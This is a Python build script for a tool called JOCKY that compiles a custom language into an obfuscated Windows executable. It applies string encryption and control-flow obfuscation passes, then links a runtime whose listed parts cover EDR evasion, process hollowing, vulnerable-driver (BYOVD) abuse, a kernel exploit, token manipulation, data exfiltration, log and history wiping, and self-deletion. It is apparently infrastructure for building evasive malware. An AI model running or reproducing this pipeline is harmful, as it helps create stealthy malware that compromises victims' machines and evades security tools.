#!/usr/bin/env python3
"""JOCKY Full Compilation Pipeline - Standalone Script

Runs each compilation stage sequentially with detailed logging:
  1. Parse    - Lex, parse, resolve modules, type check
  2. CodeGen  - Generate LLVM IR
  3. MLIR     - Convert to MLIR and run obfuscation passes
  4. LLVM Obf - Run LLVM IR obfuscation passes
  5. Compile  - Cross-compile to Windows COFF object
  6. Link     - Link into Windows PE executable
"""
import sys
import os
import time
import subprocess
from pathlib import Path

TOOLCHAIN = Path(os.environ.get("TOOLCHAIN_PATH", "toolchain"))
SRC_DIR = Path(__file__).resolve().parent.parent / "src"
RUNTIME_DIR = SRC_DIR / "runtime"

sys.path.insert(0, str(SRC_DIR))


def log(stage, msg):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] [{stage}] {msg}", flush=True)


def run(cmd, label, cwd=None):
    log("exec", f"{label}: {' '.join(str(c) for c in cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=cwd)
    if result.stdout.strip():
        for line in result.stdout.strip().split("\n"):
            log("exec", f"  stdout: {line}")
    if result.stderr.strip():
        for line in result.stderr.strip().split("\n"):
            log("exec", f"  stderr: {line}")
    if result.returncode != 0:
        log("FAIL", f"{label} exited with code {result.returncode}")
        sys.exit(1)
    return result


def stage_parse(source_file, build_dir):
    log("PARSE", f"Input: {source_file}")
    from jocky.language.lexer import Lexer
    from jocky.language.parser import Parser
    from jocky.language.checker import TypeChecker
    from jocky.language.resolver import ModuleResolver

    prelude_path = SRC_DIR / "jocky" / "stdlib" / "prelude.jky"
    prelude = prelude_path.read_text() if prelude_path.exists() else ""
    src = Path(source_file).read_text()
    full_src = prelude + "\n" + src
    log("PARSE", f"Source: {len(src)} bytes + {len(prelude)} bytes prelude")

    lexer = Lexer(full_src)
    tokens = lexer.tokenize()
    log("PARSE", f"Lexed {len(tokens)} tokens")

    parser = Parser(tokens)
    ast = parser.parse()
    log("PARSE", f"Parsed {len(ast.decls)} declarations")

    resolver = ModuleResolver(Path(source_file).parent)
    ast = resolver.resolve_program(ast)
    log("PARSE", f"After module resolution: {len(ast.decls)} declarations")

    checker = TypeChecker()
    checker.check(ast)
    log("PARSE", "Type check passed")

    return ast


def stage_codegen(ast, build_dir):
    log("CODEGEN", "Generating LLVM IR")
    from jocky.language.codegen import CodeGen

    cg = CodeGen()
    ir = cg.gen(ast)
    ir_path = build_dir / "output.ll"
    ir_path.write_text(ir)

    lines = ir.strip().split("\n")
    funcs = [l for l in lines if l.startswith("define ")]
    decls = [l for l in lines if l.startswith("declare ")]
    globals_ = [l for l in lines if l.startswith("@")]
    log("CODEGEN", f"Generated {len(lines)} lines of LLVM IR ({len(ir)} bytes)")
    log("CODEGEN", f"  Functions: {len(funcs)}, Declarations: {len(decls)}, Globals: {len(globals_)}")

    for f in funcs:
        name = f.split("@")[1].split("(")[0] if "@" in f else "?"
        log("CODEGEN", f"  fn: {name}")

    return ir_path


def stage_mlir_obfuscate(ir_path, build_dir):
    log("MLIR", "Converting LLVM IR to MLIR")
    mlir_path = build_dir / "output.mlir"
    mlir_obf_path = build_dir / "output_obf.mlir"

    run([str(TOOLCHAIN / "bin" / "mlir-translate"), "--import-llvm", str(ir_path), "-o", str(mlir_path)],
        "LLVM IR -> MLIR")
    log("MLIR", f"MLIR: {mlir_path.stat().st_size} bytes, {len(mlir_path.read_text().splitlines())} lines")

    plugin = TOOLCHAIN / "lib" / "MLIRObfuscationPlugin.so"
    passes = ["--string-encrypt", "--constant-obfuscate", "--symbol-obfuscate"]
    log("MLIR", f"Running MLIR obfuscation passes: {', '.join(p.lstrip('-') for p in passes)}")

    mlir_opt = TOOLCHAIN / "bin" / "run-mlir-opt.sh"
    if not mlir_opt.exists():
        mlir_opt = TOOLCHAIN / "bin" / "mlir-opt"

    run([str(mlir_opt), f"--load-pass-plugin={plugin}"] + passes + [str(mlir_path), "-o", str(mlir_obf_path)],
        "MLIR obfuscation")
    log("MLIR", f"Obfuscated MLIR: {mlir_obf_path.stat().st_size} bytes, {len(mlir_obf_path.read_text().splitlines())} lines")

    log("MLIR", "Converting obfuscated MLIR back to LLVM IR")
    obf_ll = build_dir / "output_mlir_obf.ll"
    run([str(TOOLCHAIN / "bin" / "mlir-translate"), "--mlir-to-llvmir", str(mlir_obf_path), "-o", str(obf_ll)],
        "MLIR -> LLVM IR")
    log("MLIR", f"MLIR-obfuscated LLVM IR: {obf_ll.stat().st_size} bytes")

    obf_bc = build_dir / "output_mlir_obf.bc"
    opt = TOOLCHAIN / "bin" / "run-opt.sh"
    if not opt.exists():
        opt = TOOLCHAIN / "bin" / "opt"
    run([str(opt), str(obf_ll), "-o", str(obf_bc)], "Convert to bitcode")

    return obf_bc


def stage_llvm_obfuscate(bc_path, build_dir):
    log("LLVM-OBF", "Running LLVM IR obfuscation passes")
    plugin = TOOLCHAIN / "lib" / "LLVMObfuscationPlugin.so"
    obf_bc = build_dir / "output_full_obf.bc"

    opt = TOOLCHAIN / "bin" / "run-opt.sh"
    if not opt.exists():
        opt = TOOLCHAIN / "bin" / "opt"

    passes = "function(boguscf,flattening,substitution,split),module(indirect-call,strip-signature)"
    log("LLVM-OBF", f"Passes: {passes}")

    run([str(opt), f"-load-pass-plugin={plugin}", f"-passes={passes}", str(bc_path), "-o", str(obf_bc)],
        "LLVM obfuscation")

    orig_size = bc_path.stat().st_size
    obf_size = obf_bc.stat().st_size
    log("LLVM-OBF", f"Bitcode: {orig_size} -> {obf_size} bytes ({obf_size/orig_size:.1f}x)")

    return obf_bc


def stage_compile(bc_path, build_dir):
    log("COMPILE", "Cross-compiling to Windows x86_64 COFF object")
    obj_path = build_dir / "output.obj"
    clang = TOOLCHAIN / "bin" / "clang"

    run([str(clang), "--target=x86_64-pc-windows-gnu", "-O2", "-c", str(bc_path), "-o", str(obj_path)],
        "Bitcode -> Windows object")
    log("COMPILE", f"Object file: {obj_path.stat().st_size} bytes")

    return obj_path


def stage_compile_runtime(build_dir):
    log("RUNTIME", "Compiling JOCKY runtime for Windows")
    mingw_gcc = "x86_64-w64-mingw32-gcc"
    include_dir = RUNTIME_DIR / "include"
    objs = []

    WIN = RUNTIME_DIR / "windows"
    sources = [
        RUNTIME_DIR / "init" / "anti_analysis.c",
        RUNTIME_DIR / "util" / "mem.c",
        RUNTIME_DIR / "exfil" / "exfil.c",
        RUNTIME_DIR / "ai" / "mutation_engine.c",
        RUNTIME_DIR / "core" / "plugin.c",
        RUNTIME_DIR / "core" / "sandbox.c",
        WIN / "evasion" / "unhook.c",
        WIN / "evasion" / "syscalls.c",
        WIN / "evasion" / "stack_spoof.c",
        WIN / "evasion" / "blindside.c",
        WIN / "evasion" / "edrhoker.c",
        WIN / "execution" / "hollow.c",
        WIN / "execution" / "byovd.c",
        WIN / "execution" / "inmem.c",
        WIN / "execution" / "driver_interact.c",
        WIN / "exploitation" / "kernel_exploit.c",
        WIN / "byovd" / "btr_abuse.c",
        WIN / "byovd" / "byovd_modular.c",
        WIN / "registry" / "registry.c",
        WIN / "audit" / "audit.c",
        WIN / "anti_forensics" / "forensics.c",
        WIN / "anti_forensics" / "logs.c",
        WIN / "anti_forensics" / "self_delete.c",
        WIN / "security" / "token_manipulation.c",
        WIN / "exfil" / "enhanced_exfiltration.c",
    ]

    cflags = [
        "-O2", "-c", "-D_WIN32_WINNT=0x0600", "-DUNICODE", "-D_UNICODE",
        "-I", str(include_dir),
        "-I", str(RUNTIME_DIR),
        "-I", str(RUNTIME_DIR / "windows"),
    ]

    for src in sources:
        if not src.exists():
            log("RUNTIME", f"  skip (not found): {src.name}")
            continue
        obj = build_dir / f"rt_{src.parent.name}_{src.stem}.o"
        try:
            run([mingw_gcc] + cflags + [
                 "-I", str(src.parent),
                 str(src), "-o", str(obj)],
                f"Compile {src.name}")
            objs.append(obj)
            log("RUNTIME", f"  compiled: {src.name} -> {obj.stat().st_size} bytes")
        except SystemExit:
            log("RUNTIME", f"  warning: failed to compile {src.name}, continuing")

    stub = build_dir / "compat_stub.c"
    stub_o = build_dir / "compat_stub.o"
    stub_src = (
        '#include <stddef.h>\n'
        '#include <stdint.h>\n'
        'void println(const char* s) { (void)s; }\n'
        'const char* string(int64_t val) { (void)val; return ""; }\n'
        'const char* jocky_str_concat(const char* a, const char* b) { (void)a; (void)b; return ""; }\n'
        'int64_t array_len(void* arr) { (void)arr; return 0; }\n'
        'void* array_append(void* arr, void* elem) { (void)arr; (void)elem; return (void*)0; }\n'
        'void jocky_sleep_and_recheck(void) {}\n'
        'typedef int jocky_aes_ctx_t;\n'
        'typedef int jocky_rsa_key_t;\n'
        'typedef int jocky_ecdh_key_t;\n'
        'jocky_aes_ctx_t jocky_aes_create(const void* k, int ks, const void* i, int is) { (void)k;(void)ks;(void)i;(void)is; return 0; }\n'
        'int jocky_aes_encrypt(jocky_aes_ctx_t c, const void* p, int pl, void* o, int* ol) { (void)c;(void)p;(void)pl;(void)o;(void)ol; return -1; }\n'
        'int jocky_aes_decrypt(jocky_aes_ctx_t c, const void* p, int pl, void* o, int* ol) { (void)c;(void)p;(void)pl;(void)o;(void)ol; return -1; }\n'
        'void jocky_aes_destroy(jocky_aes_ctx_t c) { (void)c; }\n'
        'jocky_rsa_key_t jocky_rsa_generate_keypair(int b) { (void)b; return 0; }\n'
        'int jocky_rsa_encrypt(jocky_rsa_key_t k, const void* p, int pl, void* o, int* ol) { (void)k;(void)p;(void)pl;(void)o;(void)ol; return -1; }\n'
        'int jocky_rsa_decrypt(jocky_rsa_key_t k, const void* p, int pl, void* o, int* ol) { (void)k;(void)p;(void)pl;(void)o;(void)ol; return -1; }\n'
        'int jocky_rsa_sign(jocky_rsa_key_t k, const void* d, int dl, void* s, int* sl) { (void)k;(void)d;(void)dl;(void)s;(void)sl; return -1; }\n'
        'int jocky_rsa_verify(jocky_rsa_key_t k, const void* d, int dl, const void* s, int sl) { (void)k;(void)d;(void)dl;(void)s;(void)sl; return -1; }\n'
        'int jocky_rsa_export_public_pem(jocky_rsa_key_t k, void* o, int* ol) { (void)k;(void)o;(void)ol; return -1; }\n'
        'int jocky_rsa_export_private_pem(jocky_rsa_key_t k, void* o, int* ol) { (void)k;(void)o;(void)ol; return -1; }\n'
        'void jocky_rsa_destroy(jocky_rsa_key_t k) { (void)k; }\n'
        'jocky_ecdh_key_t jocky_ecdh_generate_keypair(int c) { (void)c; return 0; }\n'
        'int jocky_ecdh_export_public_key(jocky_ecdh_key_t k, void* o, int* ol) { (void)k;(void)o;(void)ol; return -1; }\n'
        'int jocky_ecdh_compute_shared_secret(jocky_ecdh_key_t k, const void* pk, int pkl, void* s, int* sl) { (void)k;(void)pk;(void)pkl;(void)s;(void)sl; return -1; }\n'
        'void jocky_ecdh_destroy(jocky_ecdh_key_t k) { (void)k; }\n'
        'int jocky_exfil_local_cdn(const void* d, int l, const char* n) { (void)d;(void)l;(void)n; return -1; }\n'
        'int jocky_exfil_list_cdn_files(void* o, int c) { (void)o;(void)c; return 0; }\n'
        'int jocky_exfil_verify_cdn_hash(const char* n) { (void)n; return -1; }\n'
        'int jocky_exfil_download_from_cdn(const char* n, void* o, int* ol) { (void)n;(void)o;(void)ol; return -1; }\n'
        'int jocky_linux_wipe_bash_history(void) { return 0; }\n'
        'int jocky_linux_wipe_zsh_history(void) { return 0; }\n'
        'int jocky_linux_wipe_shell_history(void) { return 0; }\n'
        'int jocky_linux_clear_syslog(void) { return 0; }\n'
        'int jocky_linux_clear_audit_log(void) { return 0; }\n'
        'int jocky_linux_clear_journal(void) { return 0; }\n'
        'int jocky_linux_clear_dmesg(void) { return 0; }\n'
        'int jocky_linux_wipe_tmp(void) { return 0; }\n'
        'int jocky_linux_wipe_home_cache(void) { return 0; }\n'
        'int jocky_linux_clear_command_history(void) { return 0; }\n'
        'int jocky_linux_wipe_sudo_logs(void) { return 0; }\n'
        'int jocky_linux_wipe_wtmp_utmp(void) { return 0; }\n'
        'int jocky_linux_cleanup_all_forensics(void) { return 0; }\n'
    )
    stub.write_text(stub_src)
    run([mingw_gcc, "-c", str(stub), "-o", str(stub_o)], "Compile compat stub")
    objs.append(stub_o)
    log("RUNTIME", f"Total runtime objects: {len(objs)}")
    return objs


def stage_link(obj_path, runtime_objs, build_dir, output_name):
    log("LINK", "Linking Windows PE executable")
    exe_path = build_dir / output_name
    mingw_gcc = "x86_64-w64-mingw32-gcc"

    all_objs = [str(obj_path)] + [str(o) for o in runtime_objs]
    cmd = [
        mingw_gcc,
        *all_objs,
        "-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi",
        "-ladvapi32", "-lkernel32", "-lws2_32",
        "-o", str(exe_path),
    ]
    run(cmd, "Link PE executable")
    log("LINK", f"Output: {exe_path} ({exe_path.stat().st_size} bytes)")

    result = subprocess.run(["file", str(exe_path)], capture_output=True, text=True)
    log("LINK", f"File type: {result.stdout.strip()}")

    return exe_path


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <source.jky> [output_dir]")
        sys.exit(1)

    source_file = sys.argv[1]
    build_dir = Path(sys.argv[2]) if len(sys.argv) > 2 else Path("/workspace/build")
    build_dir.mkdir(parents=True, exist_ok=True)

    log("PIPELINE", "=" * 60)
    log("PIPELINE", "JOCKY Compilation Pipeline")
    log("PIPELINE", f"Source: {source_file}")
    log("PIPELINE", f"Build dir: {build_dir}")
    log("PIPELINE", f"Toolchain: {TOOLCHAIN}")
    log("PIPELINE", f"Target: Windows x86_64 (PE/COFF)")
    log("PIPELINE", "=" * 60)

    start = time.time()

    log("PIPELINE", "Stage 1/6: Parse")
    ast = stage_parse(source_file, build_dir)

    log("PIPELINE", "Stage 2/6: CodeGen")
    ir_path = stage_codegen(ast, build_dir)

    log("PIPELINE", "Stage 3/6: MLIR Obfuscation")
    mlir_bc = stage_mlir_obfuscate(ir_path, build_dir)

    log("PIPELINE", "Stage 4/6: LLVM Obfuscation")
    obf_bc = stage_llvm_obfuscate(mlir_bc, build_dir)

    log("PIPELINE", "Stage 5/6: Cross-Compile")
    obj_path = stage_compile(obf_bc, build_dir)

    log("PIPELINE", "Stage 5b/6: Compile Runtime")
    runtime_objs = stage_compile_runtime(build_dir)

    log("PIPELINE", "Stage 6/6: Link")
    stem = Path(source_file).stem
    exe_path = stage_link(obj_path, runtime_objs, build_dir, f"{stem}.exe")

    elapsed = time.time() - start
    log("PIPELINE", "=" * 60)
    log("PIPELINE", f"BUILD COMPLETE in {elapsed:.1f}s")
    log("PIPELINE", f"Output: {exe_path}")
    log("PIPELINE", "=" * 60)


if __name__ == "__main__":
    main()
